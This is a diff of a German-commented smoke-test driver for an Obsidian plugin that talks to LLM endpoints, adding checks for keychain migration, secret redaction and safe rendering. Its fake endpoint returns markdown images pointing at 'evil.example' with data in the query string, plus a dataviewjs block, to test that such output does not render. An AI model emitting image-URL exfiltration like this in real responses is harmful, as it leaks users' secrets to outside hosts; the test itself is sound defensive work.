+    "V6 Ein dataviewjs-Block in der Antwort rendert als Text, nicht als Codeblock",
+  ];
+  const P = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
+  let fake: FakeChatEndpoint | null = null;
+  let vorher: unknown = null;
+  try {
+    await removeFakeManager(cdp);
+    fake = await startFakeChatEndpoint(SCHUTZ_MODELL, (body) => {
+      // Jeden Platzhalter der Anfrage spiegeln — als Text, als Bild-URL (ein Bild je Platzhalter, damit die
+      // Gegenprobe auch einen Platzhalter trifft, dessen Original keine Leerzeichen traegt) und als dataviewjs-Block.
+      const platzhalter = [...JSON.stringify(body.messages).matchAll(/\[redacted-[a-z-]+-\d+\]/g)].map((m) => m[0]);
+      const liste = platzhalter.length ? platzhalter : ["(kein Platzhalter gesehen)"];
+      return `Echo ${liste.join(" ")}\n\n${liste.map((p) => `![x](https://evil.example/?d=${p})`).join("\n")}\n\n\`\`\`dataviewjs\ndv.paragraph("smoke")\n\`\`\`\n`;
+    });
+    console.log(`  Fake-Endpunkt: ${fake.url}`);
+    vorher = await cdp.evaluate(`const l = ${P}.settings.llm; return { eps: l.endpoints, model: l.model, choice: l.choice ?? null };`);
+    // Ein Endpunkt MIT Klartext-Schluessel (ein Staging-Vault ohne Schluessel misst sonst nichts),
+    // dann resolve({ force: true }) — erst das migriert in den Schluesselbund und speichert.
+    await cdp.evaluate(`
+      const p = ${P};
+      p.settings.llm.endpoints = [{ url: ${JSON.stringify(fake.url)}, apiKey: ${JSON.stringify(V_ZEILEN_SCHLUESSEL)} }];
+      p.settings.llm.model = ${JSON.stringify(SCHUTZ_MODELL)}; p.settings.llm.choice = {};
+      p.llm.invalidate();
+      await p.llm.resolve({ force: true });
+      await new Promise((r) => setTimeout(r, 400));
+      return true;`);
+    const platte = JSON.parse((await readVaultFile(cdp, DATA_PATH)) ?? "{}") as { llm?: { endpoints?: Array<{ apiKey?: string; secretId?: string }> } };
+    const zeile = platte.llm?.endpoints?.[0];
+    const bund = await schluesselbund(cdp);
+    const imBund = bund && zeile?.secretId ? bund[zeile.secretId] : undefined;
+    record(NAMEN[0]!, bund ? zeile?.apiKey === undefined && (zeile?.secretId ?? "").startsWith(EP_SECRET_PREFIX) && imBund === V_ZEILEN_SCHLUESSEL : zeile?.apiKey === V_ZEILEN_SCHLUESSEL,
+      bund ? `data.json: apiKey ${zeile?.apiKey === undefined ? "fehlt" : "ist noch da"}, secretId ${JSON.stringify(zeile?.secretId ?? null)}, Schluesselbund-Wert ${imBund === V_ZEILEN_SCHLUESSEL ? "stimmt" : "falsch/fehlt"}`
+        : "kein Schluesselbund (< 1.11.4) — Wert bleibt in der Zeile");
+
+    const frage = `Smoke V: Schluessel ${V_SK} und Authorization Bearer ${V_GEHEIMNIS} bitte pruefen`;
+    const ok = await laufeDeutung(cdp, 20000, frage);
+    const body = fake.lastBody();
+    const draht = JSON.stringify(body?.messages ?? []);
+    record(NAMEN[1]!, ok && fake.lastAuth() === `Bearer ${V_ZEILEN_SCHLUESSEL}`, `Authorization-Header am Fake-Server: ${JSON.stringify(fake.lastAuth())}`);
+    record(NAMEN[2]!, ok && draht.includes("[redacted-token") && !draht.includes(V_GEHEIMNIS) && !draht.includes(V_SK),
+      ok ? `Platzhalter im Body: ${draht.includes("[redacted-token") ? "ja" : "nein"}, Klartext-Geheimnis im Body: ${draht.includes(V_GEHEIMNIS) || draht.includes(V_SK) ? "JA" : "nein"}` : "Deutungslauf lieferte kein Ergebnis");
+
+    const dom = await cdp.evaluate<{ text: string; imgs: number; evilImg: number; codeblock: number }>(`
+      const b = document.querySelector(".yijing-interpretation-body");
+      return { text: b?.textContent ?? "", imgs: b?.querySelectorAll("img").length ?? -1,
+        evilImg: b?.querySelectorAll('img[src*="evil.example"], [src*="evil.example"]').length ?? -1,
+        codeblock: b?.querySelectorAll('pre, code, [class*="dataviewjs"]').length ?? -1 };`);
+    record(NAMEN[3]!, ok && dom.text.includes(V_GEHEIMNIS) && dom.text.includes(V_SK), ok ? `Deutung enthaelt beide Originale: ${dom.text.includes(V_GEHEIMNIS) && dom.text.includes(V_SK) ? "ja" : "nein"}` : "kein Ergebnis");
+    record(NAMEN[4]!, ok && dom.imgs === 0 && dom.evilImg === 0, `img-Elemente: ${dom.imgs}, Elemente mit evil.example-Quelle: ${dom.evilImg}`);
+    record(NAMEN[5]!, ok && dom.codeblock === 0 && dom.text.includes("dataviewjs"), `pre/code/dataviewjs-Elemente: ${dom.codeblock}, Text enthaelt „dataviewjs“: ${dom.text.includes("dataviewjs") ? "ja" : "nein"}`);
+  } catch (e) {
+    for (const n of NAMEN) if (!checks.some((c) => c.name === n)) skipped(n, `Messung abgebrochen: ${(e as Error).message}`);
+  } finally {
+    if (fake) await fake.close().catch(() => undefined);
+    if (vorher !== null) {
+      await cdp.evaluate(`
+        const v = ${JSON.stringify(vorher)}; const p = ${P};
+        p.settings.llm.endpoints = v.eps; p.settings.llm.model = v.model;
+        if (v.choice === null) delete p.settings.llm.choice; else p.settings.llm.choice = v.choice;
+        p.llm.invalidate(); await p.saveSettings();
         return true;`).catch(() => null);
     }
   }
@@ -1281,13 +1429,20 @@ async function pruefeEchtenEndpunkt(cdp: Cdp): Promise<void> {
   try {
     await cdp.evaluate(`
       const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
-      p.settings.llm.endpoints = [${JSON.stringify(url)}]; p.settings.llm.model = ${JSON.stringify(modell)};
+      p.settings.llm.endpoints = [{ url: ${JSON.stringify(url)} }]; p.settings.llm.model = ${JSON.stringify(modell)};
       p.settings.llm.choice = {}; p.settings.request.thinking.creative = "off";
-      await p.saveSettings();
+      p.llm.invalidate(); await p.saveSettings();
       return true;`);
-    const ok = await laufeDeutung(cdp, 150_000); // ein echtes Modell denkt vor der ersten Antwort
-    const laenge = await cdp.evaluate<number>(`return (document.querySelector(".yijing-interpretation-body")?.textContent ?? "").trim().length;`);
-    record(name, ok && laenge > 0, ok ? `${laenge} Zeichen Deutung von ${modell}` : "Deutungslauf lieferte kein Ergebnis");
+    // Ein echtes 7B-Modell schreibt ~35 Zeichen/s: eine volle Deutung (~3800 Zeichen) braucht 110–160 s (gemessen 2026-10-09).
+    // Mit 150 s Frist war M4 an einem langsamen Lauf rot, ohne dass etwas kaputt war.
+    // Umgeschrieben (Welle 15): vorher wartete M4 auf die FERTIGE Deutung. Ein 7B-Coder-Modell ohne
+    // Token-Grenze schrieb am 2026-10-09 in 3 von 7 Laeufen ueber 10 000 Zeichen weiter und liess M4 rot
+    // werden, obwohl der Stream lief. Belegt wird jetzt: der Stream liefert Text (>= 400 Zeichen), dann Abbruch.
+    const t0 = Date.now();
+    const ok = await laufeDeutung(cdp, 240_000, "Smoke M: Endpunkt-Manager", 400);
+    const dauer = Math.round((Date.now() - t0) / 1000);
+    const laenge = letzteDeutungLaenge;
+    record(name, ok && laenge >= 400, ok ? `${laenge} Zeichen Deutung von ${modell} nach ${dauer} s (Stream, danach abgebrochen oder beendet)` : "Deutungslauf lieferte kein Ergebnis");
   } finally {
     await cdp.evaluate(`
       const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
@@ -1295,7 +1450,7 @@ async function pruefeEchtenEndpunkt(cdp: Cdp): Promise<void> {
       p.settings.llm.endpoints = v.eps; p.settings.llm.model = v.model;
       if (v.thinking === null) delete p.settings.request.thinking.creative; else p.settings.request.thinking.creative = v.thinking;
       if (v.choice === null) delete p.settings.llm.choice; else p.settings.llm.choice = v.choice;
-      await p.saveSettings();
+      p.llm.invalidate(); await p.saveSettings();
       return true;`).catch(() => null);
   }
 }
@@ -1397,7 +1552,7 @@ async function main(): Promise<void> {
     void (async () => {
       console.log(`\n\nAbbruch durch ${signal} — raeume Vault-Zustand auf...`);
       if (originalBund) {
-        await schluesselbundZuruecksetzen(cdp, originalBund.wert).catch(() => undefined);
+        await schluesselbundZuruecksetzen(cdp, originalBund).catch(() => undefined);
       }
       await removeFakeManager(cdp).catch(() => undefined);
       for (const pfad of aufraeumen) {
@@ -1460,17 +1615,17 @@ async function main(): Promise<void> {
     // gegen den eigenen Rest statt gegen einen frischen Ausgangszustand (Master-Fund,
     // ctrlc-w7b 14:37: die vermeintlich "vorbestehenden" Rot B6/B8 WAREN genau dieser Fall).
     // Marker: alle Testwerte dieses Treibers tragen das Praefix "smoke-".
-    const kaputterBund = originalBund?.wert?.startsWith("smoke-") === true;
+    const kaputterBund = Object.values(originalBund ?? {}).some((w) => w.startsWith("smoke-"));
     record(
       "B-1 Kein liegen gebliebener Smoke-Schluessel im Schluesselbund aus einem abgebrochenen Vorlauf",
       !kaputterBund,
       kaputterBund
-        ? `Schluesselbund trug noch ${JSON.stringify(originalBund!.wert)} — entfernt`
+        ? `Schluesselbund trug noch ${JSON.stringify(Object.entries(originalBund ?? {}).filter(([, w]) => w.startsWith("smoke-")))} — entfernt`
         : "Ausgangszustand unauffaellig",
     );
     if (kaputterBund) {
-      await schluesselbundZuruecksetzen(cdp, null);
-      originalBund = { wert: null };
+      originalBund = Object.fromEntries(Object.entries(originalBund ?? {}).filter(([, w]) => !w.startsWith("smoke-")));
+      await schluesselbundZuruecksetzen(cdp, originalBund);
     }
 
     await abschnittMigration(cdp);
@@ -1478,6 +1633,7 @@ async function main(): Promise<void> {
     await abschnittDeklarativ(cdp, port);
     if (!argv.includes("--kein-manager")) await pruefeManager(cdp, port);
     await pruefeAnfrage(cdp, port);
+    await pruefeSchutz(cdp);
     await pruefeEchtenEndpunkt(cdp);
 
     if (keinBild) {
@@ -1506,8 +1662,8 @@ async function main(): Promise<void> {
       console.log(`  Papierkorb: ${pfad}`);
     }
     if (originalBund) {
-      await schluesselbundZuruecksetzen(cdp, originalBund.wert);
-      console.log(`  Schluesselbund zurueckgesetzt: ${originalBund.wert === null ? "Eintrag entfernt" : "Vorwert geschrieben"}`);
+      await schluesselbundZuruecksetzen(cdp, originalBund);
+      console.log(`  Schluesselbund zurueckgesetzt: ${Object.keys(originalBund).length} Vorwert(e) geschrieben, Neues entfernt`);
     }
     if (originalData !== null) {
       await writeVaultFile(cdp, DATA_PATH, originalData);
@@ -1517,16 +1673,18 @@ async function main(): Promise<void> {
       // Trug die Wirts-data.json noch einen Klartext-Schluessel, migriert ihn der Reload in
       // den Schluesselbund und schreibt data.json neu — das ist die Sache selbst, keine
       // Abweichung. Erkannt daran, dass nur `llm.apiKey` geleert wurde.
+      // Trug die Wirts-data.json noch die alte Form (`llm.apiKey`, Endpunkte als Text), migriert der
+      // Reload sie und schreibt data.json neu — das ist die Sache selbst, keine Abweichung.
       const migriert = wieder !== originalData && (() => {
         try {
-          const a = JSON.parse(originalData) as { llm?: { apiKey?: string } };
-          const b = JSON.parse(wieder ?? "{}") as { llm?: { apiKey?: string } };
-          if (!a.llm?.apiKey || b.llm?.apiKey !== "") return false;
-          a.llm.apiKey = "";
-          return JSON.stringify(a) === JSON.stringify(b);
+          const a = JSON.parse(originalData) as { llm?: { apiKey?: string; endpoints?: unknown } };
+          const b = JSON.parse(wieder ?? "{}") as { llm?: { apiKey?: string; endpoints?: unknown } };
+          const alteForm = a.llm?.apiKey !== undefined || typeof a.llm?.endpoints === "string"
+            || (Array.isArray(a.llm?.endpoints) && a.llm.endpoints.some((e) => typeof e === "string"));
+          return alteForm && b.llm?.apiKey === undefined;
         } catch { return false; }
       })();
-      console.log(`  data.json zurueckgeschrieben: ${wieder === originalData ? "byte-gleich" : migriert ? "Klartext-Schluessel des Wirts in den Schluesselbund migriert (erwartet)" : "ABWEICHUNG — pruefen!"}`);
+      console.log(`  data.json zurueckgeschrieben: ${wieder === originalData ? "byte-gleich" : migriert ? "alte Form des Wirts (Textliste, llm.apiKey) migriert (erwartet)" : "ABWEICHUNG — pruefen!"}`);
     }
     await closeSettings(cdp, null);
 
